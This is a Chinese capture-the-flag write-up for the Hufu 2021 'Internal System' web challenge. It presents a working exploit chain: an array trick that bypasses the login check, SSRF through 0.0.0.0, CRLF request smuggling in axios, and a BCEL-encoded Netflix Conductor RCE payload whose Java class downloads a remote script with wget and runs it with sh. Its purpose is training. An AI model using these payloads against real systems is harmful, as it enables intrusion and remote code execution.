# 虎符2021 web0解题 Internal System

## 0x01 解题

![image-20210416180454008](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416180454008.png)

拿到源码

```
const express = require('express')
const router = express.Router()

const axios = require('axios')

const isIp = require('is-ip')
const IP = require('ip')

const UrlParse = require('url-parse')

const {sha256, hint} = require('./utils')

const salt = 'nooooooooodejssssssssss8_issssss_beeeeest'

const adminHash = sha256(sha256(salt + 'admin') + sha256(salt + 'admin'))

const port = process.env.PORT || 3000

function formatResopnse(response) {
  if(typeof(response) !== typeof('')) {
    return JSON.stringify(response)
  } else {
    return response
  }
}

function SSRF_WAF(url) {
  const host = new UrlParse(url).hostname.replace(/\[|\]/g, '')

  return isIp(host) && IP.isPublic(host)
}

function FLAG_WAF(url) {
  const pathname = new UrlParse(url).pathname
  return !pathname.startsWith('/flag')
}

function OTHER_WAF(url) {
  return true;
}

const WAF_LISTS = [OTHER_WAF, SSRF_WAF, FLAG_WAF]

router.get('/', (req, res, next) => {
  if(req.session.admin === undefined || req.session.admin === null) {
    res.redirect('/login')
  } else {
    res.redirect('/index')
  }
})

router.get('/login', (req, res, next) => {
  const {username, password} = req.query;

  if(!username || !password || username === password || username.length === password.length || username === 'admin') {
    res.render('login')
  } else {
    const hash = sha256(sha256(salt + username) + sha256(salt + password))

    req.session.admin = hash === adminHash

    res.redirect('/index')
  }
})

router.get('/index', (req, res, next) => {
  if(req.session.admin === undefined || req.session.admin === null) {
    res.redirect('/login')
  } else {
    res.render('index', {admin: req.session.admin, network: JSON.stringify(require('os').networkInterfaces())})
  }
})

router.get('/proxy', async(req, res, next) => {
  if(!req.session.admin) {
    return res.redirect('/index')
  }
  const url = decodeURI(req.query.url);

  console.log(url)

  const status = WAF_LISTS.map((waf)=>waf(url)).reduce((a,b)=>a&&b)

  if(!status) {
    res.render('base', {title: 'WAF', content: "Here is the waf..."})
  } else {
    try {
      const response = await axios.get(`http://127.0.0.1:${port}/search?url=${url}`)
      res.render('base', response.data)
    } catch(error) {
      res.render('base', error.message)
    }
  }
})

router.post('/proxy', async(req, res, next) => {
  if(!req.session.admin) {
    return res.redirect('/index')
  }
  // test url
  // not implemented here
  const url = "https://postman-echo.com/post"
  await axios.post(`http://127.0.0.1:${port}/search?url=${url}`)
  res.render('base', "Something needs to be implemented")
})


router.all('/search', async (req, res, next) => {
  if(!/127\.0\.0\.1/.test(req.ip)){
    return res.send({title: 'Error', content: 'You can only use proxy to aceess here!'})
  }

  const result = {title: 'Search Success', content: ''}

  const method = req.method.toLowerCase()
  const url = decodeURI(req.query.url)
  const data = req.body

  try {
    if(method == 'get') {
      const response = await axios.get(url)
      result.content = formatResopnse(response.data)
    } else if(method == 'post') {
      const response = await axios.post(url, data)
      result.content = formatResopnse(response.data)
    } else {
      result.title = 'Error'
      result.content = 'Unsupported Method'
    }
  } catch(error) {
    result.title = 'Error'
    result.content = error.message
  }

  return res.json(result)
})

router.get('/source', (req, res, next)=>{
  res.sendFile( __dirname + "/" + "index.js");
})

router.get('/flag', (req, res, next) => {
  if(!/127\.0\.0\.1/.test(req.ip)){
    return res.send({title: 'Error', content: 'No Flag For You!'})
  }
  return res.json({hint: hint})
})

module.exports = router
```

下面开始代码审计

安装三个关键的库文件

```
axios
is-ip
ip
```

然后定位到我们首先打开的login路由。

```
!username || !password || username === password || username.length === password.length || username === 'admin'
```

绕过这个一串

![image-20210416181024051](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416181024051.png)

这一串又告诉我们只有密码和账号都是admin的时候才能正常登录。

现在来绕过第一个。

**数组在js这种弱类型语言的运用。**

![image-20210416181317013](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416181317013.png)

这样就不难看出，在进行字符串拼接的时候，nodejs会默认把数组中的字符都取出来然后进行拼接。下面绕过就简单了。

```
username[]=admin&password=admin
```

然后题目继续

![image-20210416181547141](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416181547141.png)

![image-20210416181630521](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416181630521.png)

下面我们就可以看到是这一步了。大概就是balabal一堆检测

![image-20210416181852742](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416181852742.png)

很正常的ssrf利用了。

首先isPublic:

![image-20210416230809151](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416230809151.png)

过滤10段，192.168，172,169,还有ipv6的私有地址保留。

但是我们知道还有`0.0.0.0`这个比localhost的监听范围更大。（具体原因可百度..

绕后这一步可以用这个绕

![image-20210416232338613](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416232338613.png)

这里面的3000端口是js的默认端口，可以看到成功绕过了，下一步就是继续访问flag页面了。

![image-20210416232650785](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416232650785.png)

额，该死的flagwaf。

我们来看一下还剩下的一个路由`search`

![image-20210416232756567](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416232756567.png)

可以看到其中并没有调用waf，那我们就可以套娃了。

```
url=http://0.0.0.0:3000/search?url=http://127.0.0.1:3000/flag
```

![image-20210416232913261](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416232913261.png)

找打了一提示。然后开始扫内网（百度可以知道这个主机的常用端口是8080，我们就可以直接把端口设置为8080，然后继续食用即可。结合界面给的c段很容易扫出来是

![image-20210416233038279](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416233038279.png)

```
10.0.83.14:8080
```

![image-20210416233114386](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416233114386.png)

然后，就很容易发现这是他的swagger.

结合`CVE-2020-9296` https://blog.csdn.net/xj28555/article/details/106908718/

漏洞poc

```
public class Evil {
    public Evil() {
        try {
            Runtime.getRuntime().exec("touch /tmp/pwned");
        } catch (Exception e) {
            e.printStackTrace();
        }
 
    }
 
    public static void main(String[] args) {
    }
}
```

bcel编码

工具：https://github.com/f1tz/BCELCodeman

```
java -jar BCELCodeman.jar e Evil.class 
```

注意jdk使用1.8版本。

本地起一个测试环境保证生成的payload可以用。

![image-20210416234034158](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416234034158.png)

```
$$BCEL$$$l$8b$I$A$A$A$A$A$A$Am$91$cdN$C1$U$85O$87$91$81q$Q$QA$c1$3f$d4$85$a8$89l$dca$dc$Y$5d$e1O$84$e8$c2$8d$c3$d0$60$91$99$nC1$bc$91k6h$5c$f8$A$3e$94z$5b$T1$d1$s$bd$ed$3d$f7$f4$bbi$fb$fe$f1$fa$G$e0$A$5b6$SX$b0$91G$n$81E$b5$$Y$u$da$98A$c9$c2$b2$85$V$86$f8$a1$I$84$3cb$88Uv$ae$Z$cc$e3$b0$cd$Z$d2u$R$f0$f3$a1$df$e2Q$d3m$f5HI5$a4$eb$3d$9c$b9$7d$9d$eb$d3E$b2$fb$ae$I$Y$K$95$dbz$d7$7dt$ab$3d7$e8T$h2$SA$a7$a6pv$p$iF$k$3f$V$K$91$3cy$U$bd$7d$e5s$90$84ma$d5$c1$g$d6$a9$9b$M$87$de$7d$b9$w$fd$7e$b5$cd$fd$d0A$Z$h$M$b9$v$f2d$e4$f1$be$Ua$e0$60$T6$f5U$u$86$cc$d4q$d1$earO2d$a7$d2$d50$90$c2$a7$c6v$87$cb$9f$q_$d9$a9$ff$f1$d4$I$c9G$dcc$d8$ae$fcs$93_$d2e$Uz$7c0$a0$D$e9$3e$V$a5$7e$96f$e4z$i$h$b0$e8$b9$d50$c0$d4$N$v$ceRvG$b9Aka$f7$Z$ec$F$c6$7cl$C$f3$e6$J$89$fa$de$E$f11$b9L$a4$90$a1_1$e0$90$af$84$b8f$98Z$b7t$rKZ$9e$98$v$aad$60$7cR$60$W$e6TH$9b$a4g$c8$f1$dd$adH$93$a99$d6$h$F$8ck$c1$a18$af$c1$b9$_$J$ae$b6$90$n$C$A$A
```

这样一串就是生成成功了。

```
curl --location --request POST 'http://localhost:8080/api/metadata/taskdefs' \
--header 'Content-Type: application/json' \
--data-raw '[{
  "name": "${'\'' '\''.getClass().forName('\''com.sun.org.apache.bcel.internal.util.ClassLoader'\'').newInstance().loadClass('\''$$BCEL$$$l$8b$I$A$A$A$A$A$A$Am$91$cdN$C1$U$85O$87$91$81q$Q$QA$c1$3f$d4$85$a8$89l$dca$dc$Y$5d$e1O$84$e8$c2$8d$c3$d0$60$91$99$nC1$bc$91k6h$5c$f8$A$3e$94z$5b$T1$d1$s$bd$ed$3d$f7$f4$bbi$fb$fe$f1$fa$G$e0$A$5b6$SX$b0$91G$n$81E$b5$$Y$u$da$98A$c9$c2$b2$85$V$86$f8$a1$I$84$3cb$88Uv$ae$Z$cc$e3$b0$cd$Z$d2u$R$f0$f3$a1$df$e2Q$d3m$f5HI5$a4$eb$3d$9c$b9$7d$9d$eb$d3E$b2$fb$ae$I$Y$K$95$dbz$d7$7dt$ab$3d7$e8T$h2$SA$a7$a6pv$p$iF$k$3f$V$K$91$3cy$U$bd$7d$e5s$90$84ma$d5$c1$g$d6$a9$9b$M$87$de$7d$b9$w$fd$7e$b5$cd$fd$d0A$Z$h$M$b9$v$f2d$e4$f1$be$Ua$e0$60$T6$f5U$u$86$cc$d4q$d1$earO2d$a7$d2$d50$90$c2$a7$c6v$87$cb$9f$q_$d9$a9$ff$f1$d4$I$c9G$dcc$d8$ae$fcs$93_$d2e$Uz$7c0$a0$D$e9$3e$V$a5$7e$96f$e4z$i$h$b0$e8$b9$d50$c0$d4$N$v$ceRvG$b9Aka$f7$Z$ec$F$c6$7cl$C$f3$e6$J$89$fa$de$E$f11$b9L$a4$90$a1_1$e0$90$af$84$b8f$98Z$b7t$rKZ$9e$98$v$aad$60$7cR$60$W$e6TH$9b$a4g$c8$f1$dd$adH$93$a99$d6$h$F$8ck$c1$a18$af$c1$b9$_$J$ae$b6$90$n$C$A$A'\'').newInstance().class}",
  "ownerEmail": "test@example.org",
  "retryCount": 3,
  "timeoutSeconds": 1200,
  "inputKeys": [
    "sourceRequestId",
    "qcElementType"
  ],
  "outputKeys": [
    "state",
    "skipped",
    "result"
  ],
  "timeoutPolicy": "TIME_OUT_WF",
  "retryLogic": "FIXED",
  "retryDelaySeconds": 600,
  "responseTimeoutSeconds": 3600,
  "concurrentExecLimit": 100,
  "rateLimitFrequencyInSeconds": 60,
  "rateLimitPerFrequency": 50,
  "isolationgroupId": "myIsolationGroupId"
}]'
```

![image-20210416234231639](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416234231639.png)

利用成功，生成的payload 没有任何问题。

```
POST /api/metadata/taskdefs? HTTP/1.1
Host: ip:8080
Content-Type: application/json
cache-control: no-cache
Postman-Token: 7bd50be1-2152-46d6-b16e-8245df0141dc
[{"name":"${'1'.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('[payload]').newInstance().class}","ownerEmail":"test@example.org","retryCount":"3","timeoutSeconds":"1200","inputKeys":["sourceRequestId","qcElementType"],"outputKeys":["state","skipped","result"],"timeoutPolicy":"TIME_OUT_WF","retryLogic":"FIXED","retryDelaySeconds":"600","responseTimeoutSeconds":"3600","concurrentExecLimit":"100","rateLimitFrequencyInSeconds":"60","rateLimitPerFrequency":"50","isolationgroupId":"myIsolationGroupId"}]
```

现在的问题怎么把payload打过去，gopher协议不能用了，现在考虑**CRLF** [CVE-2018-12116](https://www.cvedetails.com/cve/CVE-2018-12116/)

这里一个拓展就是漏洞本身是在http库产生的，但是依赖于它而新写的axios库依然没有过滤，所以构建好完美的通信之后，就可以开始拼接payload了。`\u{010D}\u{010A}`

下面用一个小脚本来生成。

```
paylaod=""
post_payload = '[\u{017b}\u{0122}name\u{0122}:\u{0122}$\u{017b}\u{0127}1\u{0127}.getClass().forName(\u{0127}com.sun.org.apache.bcel.internal.util.ClassLoader\u{0127}).newInstance().loadClass(\u{0127}'+paylaod+'\u{0127}).newInstance().class\u{017d}\u{0122},\u{0122}ownerEmail\u{0122}:\u{0122}test@example.org\u{0122},\u{0122}retryCount\u{0122}:\u{0122}3\u{0122},\u{0122}timeoutSeconds\u{0122}:\u{0122}1200\u{0122},\u{0122}inputKeys\u{0122}:[\u{0122}sourceRequestId\u{0122},\u{0122}qcElementType\u{0122}],\u{0122}outputKeys\u{0122}:[\u{0122}state\u{0122},\u{0122}skipped\u{0122},\u{0122}result\u{0122}],\u{0122}timeoutPolicy\u{0122}:\u{0122}TIME_OUT_WF\u{0122},\u{0122}retryLogic\u{0122}:\u{0122}FIXED\u{0122},\u{0122}retryDelaySeconds\u{0122}:\u{0122}600\u{0122},\u{0122}responseTimeoutSeconds\u{0122}:\u{0122}3600\u{0122},\u{0122}concurrentExecLimit\u{0122}:\u{0122}100\u{0122},\u{0122}rateLimitFrequencyInSeconds\u{0122}:\u{0122}60\u{0122},\u{0122}rateLimitPerFrequency\u{0122}:\u{0122}50\u{0122},\u{0122}isolationgroupId\u{0122}:\u{0122}myIsolationGroupId\u{0122}\u{017d}]'
net_ip = ""
console.log(encodeURI(encodeURI(encodeURI('http://0.0.0.0:3000/\u{0120}HTTP/1.1\u{010D}\u{010A}Host:127.0.0.1:3000\u{010D}\u{010A}\u{010D}\u{010A}POST\u{0120}/search?url=http://'+net_ip+':8080/api/metadata/taskdefs\u{0120}HTTP/1.1\u{010D}\u{010A}Host:127.0.0.1:3000\u{010D}\u{010A}Content-Type:application/json\u{010D}\u{010A}Content-Length:' + post_payload.length + '\u{010D}\u{010A}\u{010D}\u{010A}' + post_payload+ '\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}GET\u{0120}/private'))))
```

然后把生成的复制粘贴就可以了。

```
public class Evil {
    public Evil() {
        try {
            Runtime.getRuntime().exec("wget http://xxx/a -O /tmp/demo");
        } catch (Exception e) {
            e.printStackTrace();
        }
 
    }
 
    public static void main(String[] args) {
    }
}
```

![image-20210416235101934](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416235101934.png)

![image-20210416235410606](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416235410606.png)

![image-20210416235418813](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416235418813.png)

```
public class Evil {
    public Evil() {
        try {
            Runtime.getRuntime().exec("sh /tmp/demo");
        } catch (Exception e) {
            e.printStackTrace();
        }
 
    }
 
    public static void main(String[] args) {
    }
}
```

![image-20210416235625312](C:\Users\Dem0\AppData\Roaming\Typora\typora-user-images\image-20210416235625312.png)

这道题到这里就结束了。

## 遗留问题

0x01 crlf 漏洞

0x02 bcel编码 (学一下Java)

0x03 常见的内网的ip(搜集)

0x04 gopher协议